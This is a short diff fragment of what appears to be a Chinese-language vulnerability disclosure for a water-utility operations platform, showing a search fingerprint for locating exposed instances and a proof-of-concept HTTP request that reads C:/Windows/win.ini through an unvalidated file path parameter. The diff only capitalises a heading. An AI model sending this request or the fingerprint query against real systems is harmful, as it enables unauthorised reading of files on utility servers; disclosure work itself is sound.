@@ -8,7 +8,7 @@
 title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
 ```
 
-## poc
+## POC
 ```
 GET /Data/File/Get?path=C:/Windows/win.ini HTTP/1.1
 Host: [被遮挡]
